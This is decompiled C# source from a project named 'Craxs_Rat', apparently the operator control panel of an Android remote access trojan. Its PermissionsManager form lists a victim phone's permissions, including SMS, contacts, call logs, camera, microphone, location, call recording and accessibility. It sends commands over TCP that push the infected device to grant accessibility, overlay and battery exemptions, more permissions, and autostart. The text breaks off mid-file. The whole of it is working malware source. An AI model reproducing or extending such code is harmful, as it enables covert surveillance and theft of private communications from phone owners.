using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000BF RID: 191
	[DesignerGenerated]
	public partial class PermissionsManager : Form
	{
		// Token: 0x06000E05 RID: 3589 RVA: 0x000936D0 File Offset: 0x000918D0
		public PermissionsManager()
		{
			this.bool_0 = false;
			this.bool_1 = false;
			this.bool_2 = false;
			this.InitializeComponent();
		}

		// Token: 0x17000422 RID: 1058
		// (get) Token: 0x06000E08 RID: 3592 RVA: 0x00006A44 File Offset: 0x00004C44
		// (set) Token: 0x06000E09 RID: 3593 RVA: 0x000951A8 File Offset: 0x000933A8
		internal virtual DrakeUITabControl DrakeUITabControl1 { get; set; }

		// Token: 0x17000423 RID: 1059
		// (get) Token: 0x06000E0A RID: 3594 RVA: 0x00006A4C File Offset: 0x00004C4C
		// (set) Token: 0x06000E0B RID: 3595 RVA: 0x000951BC File Offset: 0x000933BC
		internal virtual TabPage TabPage1 { get; set; }

		// Token: 0x17000424 RID: 1060
		// (get) Token: 0x06000E0C RID: 3596 RVA: 0x00006A54 File Offset: 0x00004C54
		// (set) Token: 0x06000E0D RID: 3597 RVA: 0x000951D0 File Offset: 0x000933D0
		internal virtual TabPage TabPage2 { get; set; }

		// Token: 0x17000425 RID: 1061
		// (get) Token: 0x06000E0E RID: 3598 RVA: 0x00006A5C File Offset: 0x00004C5C
		// (set) Token: 0x06000E0F RID: 3599 RVA: 0x000951E4 File Offset: 0x000933E4
		internal virtual DataGridView DGVPRIM { get; set; }

		// Token: 0x17000426 RID: 1062
		// (get) Token: 0x06000E10 RID: 3600 RVA: 0x00006A64 File Offset: 0x00004C64
		// (set) Token: 0x06000E11 RID: 3601 RVA: 0x000951F8 File Offset: 0x000933F8
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000427 RID: 1063
		// (get) Token: 0x06000E12 RID: 3602 RVA: 0x00006A6C File Offset: 0x00004C6C
		// (set) Token: 0x06000E13 RID: 3603 RVA: 0x0009523C File Offset: 0x0009343C
		internal virtual Panel Panel1
		{
			[CompilerGenerated]
			get
			{
				return this._Panel1;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				Panel panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint -= value2;
				}
				this._Panel1 = value;
				panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint += value2;
				}
			}
		}

		// Token: 0x17000428 RID: 1064
		// (get) Token: 0x06000E14 RID: 3604 RVA: 0x00006A74 File Offset: 0x00004C74
		// (set) Token: 0x06000E15 RID: 3605 RVA: 0x00095280 File Offset: 0x00093480
		internal virtual Label Label2 { get; set; }

		// Token: 0x17000429 RID: 1065
		// (get) Token: 0x06000E16 RID: 3606 RVA: 0x00006A7C File Offset: 0x00004C7C
		// (set) Token: 0x06000E17 RID: 3607 RVA: 0x00095294 File Offset: 0x00093494
		internal virtual Label Label1 { get; set; }

		// Token: 0x1700042A RID: 1066
		// (get) Token: 0x06000E18 RID: 3608 RVA: 0x00006A84 File Offset: 0x00004C84
		// (set) Token: 0x06000E19 RID: 3609 RVA: 0x000952A8 File Offset: 0x000934A8
		internal virtual DrakeUIComboBox comboproms { get; set; }

		// Token: 0x1700042B RID: 1067
		// (get) Token: 0x06000E1A RID: 3610 RVA: 0x00006A8C File Offset: 0x00004C8C
		// (set) Token: 0x06000E1B RID: 3611 RVA: 0x000952BC File Offset: 0x000934BC
		internal virtual Button addactiv
		{
			[CompilerGenerated]
			get
			{
				return this._addactiv;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.addactiv_Click);
				Button addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click -= value2;
				}
				this._addactiv = value;
				addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click += value2;
				}
			}
		}

		// Token: 0x1700042C RID: 1068
		// (get) Token: 0x06000E1C RID: 3612 RVA: 0x00006A94 File Offset: 0x00004C94
		// (set) Token: 0x06000E1D RID: 3613 RVA: 0x00095300 File Offset: 0x00093500
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700042D RID: 1069
		// (get) Token: 0x06000E1E RID: 3614 RVA: 0x00006A9C File Offset: 0x00004C9C
		// (set) Token: 0x06000E1F RID: 3615 RVA: 0x00095344 File Offset: 0x00093544
		internal virtual DrakeUIListBox Primslist { get; set; }

		// Token: 0x1700042E RID: 1070
		// (get) Token: 0x06000E20 RID: 3616 RVA: 0x00006AA4 File Offset: 0x00004CA4
		// (set) Token: 0x06000E21 RID: 3617 RVA: 0x00095358 File Offset: 0x00093558
		internal virtual Label Label3 { get; set; }

		// Token: 0x1700042F RID: 1071
		// (get) Token: 0x06000E22 RID: 3618 RVA: 0x00006AAC File Offset: 0x00004CAC
		// (set) Token: 0x06000E23 RID: 3619 RVA: 0x0009536C File Offset: 0x0009356C
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x17000430 RID: 1072
		// (get) Token: 0x06000E24 RID: 3620 RVA: 0x00006AB4 File Offset: 0x00004CB4
		// (set) Token: 0x06000E25 RID: 3621 RVA: 0x00095380 File Offset: 0x00093580
		internal virtual Label statustext { get; set; }

		// Token: 0x17000431 RID: 1073
		// (get) Token: 0x06000E26 RID: 3622 RVA: 0x00006ABC File Offset: 0x00004CBC
		// (set) Token: 0x06000E27 RID: 3623 RVA: 0x00095394 File Offset: 0x00093594
		internal virtual Button Button2
		{
			[CompilerGenerated]
			get
			{
				return this._Button2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				Button button = this._Button2;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button2 = value;
				button = this._Button2;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000440 RID: 1088
		// (get) Token: 0x06000E28 RID: 3624 RVA: 0x00006AC4 File Offset: 0x00004CC4
		// (set) Token: 0x06000E29 RID: 3625 RVA: 0x000953D8 File Offset: 0x000935D8
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x17000432 RID: 1074
		// (get) Token: 0x06000E2A RID: 3626 RVA: 0x00006ACC File Offset: 0x00004CCC
		// (set) Token: 0x06000E2B RID: 3627 RVA: 0x000953EC File Offset: 0x000935EC
		internal virtual DataGridViewImageColumn iconprim { get; set; }

		// Token: 0x17000433 RID: 1075
		// (get) Token: 0x06000E2C RID: 3628 RVA: 0x00006AD4 File Offset: 0x00004CD4
		// (set) Token: 0x06000E2D RID: 3629 RVA: 0x00095400 File Offset: 0x00093600
		internal virtual DataGridViewTextBoxColumn primname { get; set; }

		// Token: 0x17000434 RID: 1076
		// (get) Token: 0x06000E2E RID: 3630 RVA: 0x00006ADC File Offset: 0x00004CDC
		// (set) Token: 0x06000E2F RID: 3631 RVA: 0x00095414 File Offset: 0x00093614
		internal virtual DataGridViewTextBoxColumn Status { get; set; }

		// Token: 0x17000435 RID: 1077
		// (get) Token: 0x06000E30 RID: 3632 RVA: 0x00006AE4 File Offset: 0x00004CE4
		// (set) Token: 0x06000E31 RID: 3633 RVA: 0x00095428 File Offset: 0x00093628
		internal virtual TabPage TabPage3 { get; set; }

		// Token: 0x17000436 RID: 1078
		// (get) Token: 0x06000E32 RID: 3634 RVA: 0x00006AEC File Offset: 0x00004CEC
		// (set) Token: 0x06000E33 RID: 3635 RVA: 0x0009543C File Offset: 0x0009363C
		internal virtual PictureBox PictureBox2 { get; set; }

		// Token: 0x17000437 RID: 1079
		// (get) Token: 0x06000E34 RID: 3636 RVA: 0x00006AF4 File Offset: 0x00004CF4
		// (set) Token: 0x06000E35 RID: 3637 RVA: 0x00095450 File Offset: 0x00093650
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000438 RID: 1080
		// (get) Token: 0x06000E36 RID: 3638 RVA: 0x00006AFC File Offset: 0x00004CFC
		// (set) Token: 0x06000E37 RID: 3639 RVA: 0x00095464 File Offset: 0x00093664
		internal virtual PictureBox PictureBox1 { get; set; }

		// Token: 0x17000439 RID: 1081
		// (get) Token: 0x06000E38 RID: 3640 RVA: 0x00006B04 File Offset: 0x00004D04
		// (set) Token: 0x06000E39 RID: 3641 RVA: 0x00095478 File Offset: 0x00093678
		internal virtual Label Label4 { get; set; }

		// Token: 0x1700043A RID: 1082
		// (get) Token: 0x06000E3A RID: 3642 RVA: 0x00006B0C File Offset: 0x00004D0C
		// (set) Token: 0x06000E3B RID: 3643 RVA: 0x0009548C File Offset: 0x0009368C
		internal virtual TextBox TextBox1 { get; set; }

		// Token: 0x1700043B RID: 1083
		// (get) Token: 0x06000E3C RID: 3644 RVA: 0x00006B14 File Offset: 0x00004D14
		// (set) Token: 0x06000E3D RID: 3645 RVA: 0x000954A0 File Offset: 0x000936A0
		internal virtual DrakeUICheckBox checkbattery
		{
			[CompilerGenerated]
			get
			{
				return this._checkbattery;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkbattery_MouseClick);
				DrakeUICheckBox checkbattery = this._checkbattery;
				if (checkbattery != null)
				{
					checkbattery.MouseClick -= value2;
				}
				this._checkbattery = value;
				checkbattery = this._checkbattery;
				if (checkbattery != null)
				{
					checkbattery.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700043C RID: 1084
		// (get) Token: 0x06000E3E RID: 3646 RVA: 0x00006B1C File Offset: 0x00004D1C
		// (set) Token: 0x06000E3F RID: 3647 RVA: 0x000954E4 File Offset: 0x000936E4
		internal virtual DrakeUICheckBox checkdraw
		{
			[CompilerGenerated]
			get
			{
				return this._checkdraw;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkdraw_MouseClick);
				DrakeUICheckBox checkdraw = this._checkdraw;
				if (checkdraw != null)
				{
					checkdraw.MouseClick -= value2;
				}
				this._checkdraw = value;
				checkdraw = this._checkdraw;
				if (checkdraw != null)
				{
					checkdraw.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700043D RID: 1085
		// (get) Token: 0x06000E40 RID: 3648 RVA: 0x00006B24 File Offset: 0x00004D24
		// (set) Token: 0x06000E41 RID: 3649 RVA: 0x00095528 File Offset: 0x00093728
		internal virtual DrakeUICheckBox checkacess
		{
			[CompilerGenerated]
			get
			{
				return this._checkacess;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkacess_MouseClick);
				DrakeUICheckBox checkacess = this._checkacess;
				if (checkacess != null)
				{
					checkacess.MouseClick -= value2;
				}
				this._checkacess = value;
				checkacess = this._checkacess;
				if (checkacess != null)
				{
					checkacess.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700043E RID: 1086
		// (get) Token: 0x06000E42 RID: 3650 RVA: 0x00006B2C File Offset: 0x00004D2C
		// (set) Token: 0x06000E43 RID: 3651 RVA: 0x0009556C File Offset: 0x0009376C
		internal virtual DrakeUICheckBox Checkbg
		{
			[CompilerGenerated]
			get
			{
				return this._Checkbg;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Checkbg_MouseClick);
				DrakeUICheckBox checkbg = this._Checkbg;
				if (checkbg != null)
				{
					checkbg.MouseClick -= value2;
				}
				this._Checkbg = value;
				checkbg = this._Checkbg;
				if (checkbg != null)
				{
					checkbg.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700043F RID: 1087
		// (get) Token: 0x06000E44 RID: 3652 RVA: 0x00006B34 File Offset: 0x00004D34
		// (set) Token: 0x06000E45 RID: 3653 RVA: 0x000955B0 File Offset: 0x000937B0
		internal virtual DrakeUICheckBox checkautostart
		{
			[CompilerGenerated]
			get
			{
				return this._checkautostart;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkautostart_MouseClick);
				DrakeUICheckBox checkautostart = this._checkautostart;
				if (checkautostart != null)
				{
					checkautostart.MouseClick -= value2;
				}
				this._checkautostart = value;
				checkautostart = this._checkautostart;
				if (checkautostart != null)
				{
					checkautostart.MouseClick += value2;
				}
			}
		}

		// Token: 0x06000E46 RID: 3654 RVA: 0x000955F4 File Offset: 0x000937F4
		public void method_0(object[] objects_0)
		{
			if (this.DGVPRIM.InvokeRequired)
			{
				PermissionsManager.GDelegate19 method = new PermissionsManager.GDelegate19(this.method_0);
				this.DGVPRIM.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string[] array = (string[])objects_0[0];
				if (this.DGVPRIM.Rows.Count > 0)
				{
					this.DGVPRIM.Rows.Clear();
				}
				Bitmap bitmap = (Bitmap)Module2.smethod_38(Module0.correctsign, new Size(45, 45), false);
				Bitmap bitmap2 = (Bitmap)Module2.smethod_38(Module0.X_sign, new Size(45, 45), false);
				try
				{
					if (Operators.CompareString(array[0], "1", false) != 0)
					{
						int index = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Accessibility Service",
							"OFF"
						});
						this.DGVPRIM.Rows[index].Cells[2].Style.ForeColor = Color.Red;
						this.bool_0 = true;
						this.checkacess.Checked = false;
						this.checkacess.Enabled = true;
					}
					else
					{
						int index2 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Accessibility Service",
							"ON"
						});
						this.DGVPRIM.Rows[index2].Cells[2].Style.ForeColor = Color.Lime;
						this.bool_0 = true;
						this.checkacess.Checked = true;
						this.checkacess.Enabled = false;
					}
					if (Operators.CompareString(array[1], "1", false) == 0)
					{
						int index3 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Read Contacts",
							"ON"
						});
						this.DGVPRIM.Rows[index3].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index4 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Read Contacts",
							"OFF"
						});
						this.DGVPRIM.Rows[index4].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[2], "1", false) != 0)
					{
						int index5 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Read SMS",
							"OFF"
						});
						this.DGVPRIM.Rows[index5].Cells[2].Style.ForeColor = Color.Red;
					}
					else
					{
						int index6 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Read SMS",
							"ON"
						});
						this.DGVPRIM.Rows[index6].Cells[2].Style.ForeColor = Color.Lime;
					}
					if (Operators.CompareString(array[3], "1", false) == 0)
					{
						int index7 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Read Call Logs",
							"ON"
						});
						this.DGVPRIM.Rows[index7].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index8 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Read Call Logs",
							"OFF"
						});
						this.DGVPRIM.Rows[index8].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[4], "1", false) == 0)
					{
						int index9 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Camera",
							"ON"
						});
						this.DGVPRIM.Rows[index9].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index10 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Camera",
							"OFF"
						});
						this.DGVPRIM.Rows[index10].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[5], "1", false) != 0)
					{
						int index11 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Read Accounts",
							"OFF"
						});
						this.DGVPRIM.Rows[index11].Cells[2].Style.ForeColor = Color.Red;
					}
					else
					{
						int index12 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Read Accounts",
							"ON"
						});
						this.DGVPRIM.Rows[index12].Cells[2].Style.ForeColor = Color.Lime;
					}
					if (Operators.CompareString(array[6], "1", false) == 0)
					{
						int index13 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Microphone",
							"ON"
						});
						this.DGVPRIM.Rows[index13].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index14 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Microphone",
							"OFF"
						});
						this.DGVPRIM.Rows[index14].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[7], "1", false) == 0)
					{
						int index15 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Location",
							"ON"
						});
						this.DGVPRIM.Rows[index15].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index16 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Location",
							"OFF"
						});
						this.DGVPRIM.Rows[index16].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[8], "1", false) != 0)
					{
						int index17 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Make Calls",
							"OFF"
						});
						this.DGVPRIM.Rows[index17].Cells[2].Style.ForeColor = Color.Red;
					}
					else
					{
						int index18 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Make Calls",
							"ON"
						});
						this.DGVPRIM.Rows[index18].Cells[2].Style.ForeColor = Color.Lime;
					}
					if (Operators.CompareString(array[9], "1", false) == 0)
					{
						int index19 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Record Calls",
							"ON"
						});
						this.DGVPRIM.Rows[index19].Cells[2].Style.ForeColor = Color.Lime;
					}
					else
					{
						int index20 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Record Calls",
							"OFF"
						});
						this.DGVPRIM.Rows[index20].Cells[2].Style.ForeColor = Color.Red;
					}
					if (Operators.CompareString(array[10], "1", false) != 0)
					{
						int index21 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Send SMS",
							"OFF"
						});
						this.DGVPRIM.Rows[index21].Cells[2].Style.ForeColor = Color.Red;
					}
					else
					{
						int index22 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Send SMS",
							"ON"
						});
						this.DGVPRIM.Rows[index22].Cells[2].Style.ForeColor = Color.Lime;
					}
					if (Operators.CompareString(array[11], "1", false) != 0)
					{
						int index23 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Change Wallpaper",
							"OFF"
						});
						this.DGVPRIM.Rows[index23].Cells[2].Style.ForeColor = Color.Red;
					}
					else
					{
						int index24 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Change Wallpaper",
							"ON"
						});
						this.DGVPRIM.Rows[index24].Cells[2].Style.ForeColor = Color.Lime;
					}
					if (Operators.CompareString(array[12], "1", false) == 0)
					{
						int index25 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"battery optimizing",
							"ON"
						});
						this.DGVPRIM.Rows[index25].Cells[2].Style.ForeColor = Color.Lime;
						this.bool_2 = true;
						this.checkbattery.Checked = true;
						this.checkbattery.Enabled = false;
					}
					else
					{
						int index26 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"battery optimizing",
							"OFF"
						});
						this.DGVPRIM.Rows[index26].Cells[2].Style.ForeColor = Color.Red;
						this.bool_2 = true;
						this.checkbattery.Checked = false;
						this.checkbattery.Enabled = true;
					}
					if (Operators.CompareString(array[13], "1", false) != 0)
					{
						int index27 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap2,
							"Draw over apps",
							"OFF"
						});
						this.DGVPRIM.Rows[index27].Cells[2].Style.ForeColor = Color.Red;
						this.bool_1 = true;
						this.checkdraw.Checked = false;
						this.checkdraw.Enabled = true;
					}
					else
					{
						int index28 = this.DGVPRIM.Rows.Add(new object[]
						{
							bitmap,
							"Draw over apps",
							"ON"
						});
						this.DGVPRIM.Rows[index28].Cells[2].Style.ForeColor = Color.Lime;
						this.bool_1 = true;
						this.checkdraw.Checked = true;
						this.checkdraw.Enabled = false;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000E47 RID: 3655 RVA: 0x0009624C File Offset: 0x0009444C
		public void method_1(object[] objects_0)
		{
			if (this.statustext.InvokeRequired)
			{
				PermissionsManager.GDelegate20 method = new PermissionsManager.GDelegate20(this.method_1);
				this.statustext.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string text = Conversions.ToString(objects_0[0]);
				this.statustext.Text = text;
			}
		}

		// Token: 0x06000E48 RID: 3656 RVA: 0x000962A4 File Offset: 0x000944A4
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"RPM<*>[lod]",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				Alert.ShowSucess("Loading Permissions Started...");
			}
		}

		// Token: 0x06000E49 RID: 3657 RVA: 0x000963C8 File Offset: 0x000945C8
		private void addactiv_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text))
			{
				Alert.ShowInformation("Select Permission to Add");
			}
			else if (this.Primslist.Items.Contains(this.comboproms.Text))
			{
				Alert.ShowInformation("Permission All Ready Add");
			}
			else
			{
				this.Primslist.Items.Add(this.comboproms.Text);
				this.comboproms.Text = "";
			}
		}

		// Token: 0x06000E4A RID: 3658 RVA: 0x0009645C File Offset: 0x0009465C
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					if (this.Primslist.Items.Count < 1)
					{
						Alert.ShowInformation("Add Permissions to list First");
					}
					else
					{
						string text = "";
						try
						{
							foreach (object value in this.Primslist.Items)
							{
								string left = Conversions.ToString(value);
								if (Operators.CompareString(left, "Send SMS", false) == 0)
								{
									text += "SS<";
								}
								if (Operators.CompareString(left, "Record Calls", false) == 0)
								{
									text += "RC<";
								}
								if (Operators.CompareString(left, "Change Wallpaper", false) == 0)
								{
									text += "SW<";
								}
								if (Operators.CompareString(left, "Read SMS", false) == 0)
								{
									text += "RS<";
								}
								if (Operators.CompareString(left, "Read Call Logs", false) == 0)
								{
									text += "RCG<";
								}
								if (Operators.CompareString(left, "Read Contacts", false) == 0)
								{
									text += "CRC<";
								}
								if (Operators.CompareString(left, "Read Accounts", false) == 0)
								{
									text += "GA<";
								}
								if (Operators.CompareString(left, "Camera", false) == 0)
								{
									text += "CA<";
								}
								if (Operators.CompareString(left, "Microphone", false) == 0)
								{
									text += "MC<";
								}
								if (Operators.CompareString(left, "Location", false) == 0)
								{
									text += "LOC<";
								}
								if (Operators.CompareString(left, "Make Calls", false) == 0)
								{
									text += "CL<";
								}
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							tcpClient_,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"RPM<*>",
								text,
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
						Alert.ShowSucess("Loading Permissions Started...");
						this.Primslist.Items.Clear();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000E4B RID: 3659 RVA: 0x000967A4 File Offset: 0x000949A4
		private void Button2_Click(object sender, EventArgs e)
		{
			if (this.Primslist.Items.Count == 0)
			{
			}
			if (this.Primslist.Items.Count > 0)
			{
				if (this.Primslist.SelectedItem == null)
				{
					Alert.ShowInformation("Select Permission First");
				}
				else
				{
					this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
				}
			}
			else
			{
				Alert.ShowInformation("No Permission to Remove");
			}
		}

		// Token: 0x06000E4C RID: 3660 RVA: 0x00096824 File Offset: 0x00094A24
		private void checkacess_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkacess.Enabled && this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"RPM<*>ACC",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				Alert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000E4D RID: 3661 RVA: 0x0009695C File Offset: 0x00094B5C
		private void checkdraw_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkdraw.Enabled && this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"RPM<*>DRW",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				Alert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000E4E RID: 3662 RVA: 0x00096A94 File Offset: 0x00094C94
		private void checkbattery_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkbattery.Enabled && this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"RPM<*>DOZ",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				Alert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000E4F RID: 3663 RVA: 0x0000246D File Offset: 0x0000066D
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000E50 RID: 3664 RVA: 0x00096BCC File Offset: 0x00094DCC
		private void checkautostart_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkautostart.Checked && this.gclass8_0 != null)
			{
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					this.gclass8_0.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"rmiui<*>au",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000E51 RID: 3665 RVA: 0x00096CF4 File Offset: 0x00094EF4
